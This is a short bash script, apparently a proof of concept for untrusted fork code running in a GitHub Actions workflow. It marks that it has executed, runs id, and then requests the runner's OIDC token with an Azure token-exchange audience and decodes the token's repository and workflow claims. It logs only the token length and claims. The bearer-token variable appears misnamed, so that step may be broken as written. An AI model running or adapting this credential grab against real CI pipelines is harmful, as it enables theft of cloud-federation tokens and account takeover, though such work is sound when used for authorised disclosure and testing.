#!/usr/bin/env bash
echo "E7|FORK-CODE-EXECUTED from $(git rev-parse --show-toplevel) head=$(git rev-parse HEAD)"
id
echo "E7|ACTIONS_ID_TOKEN_REQUEST_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-EMPTY}"
if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
  TOK=$(curl -s -X POST -H "Authorization: Bearer $ACTIONS_ID_TOKEN_TOKEN" \
        -H "Accept: application/json" \
        --data "audience=api://AzureADTokenExchange" \
        "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
  echo "E7|oidc_jwt_len=${#TOK}"
  echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,repository,repository_owner,job_workflow_ref,event_name}' 2>/dev/null || echo "E7|decode failed"
fi
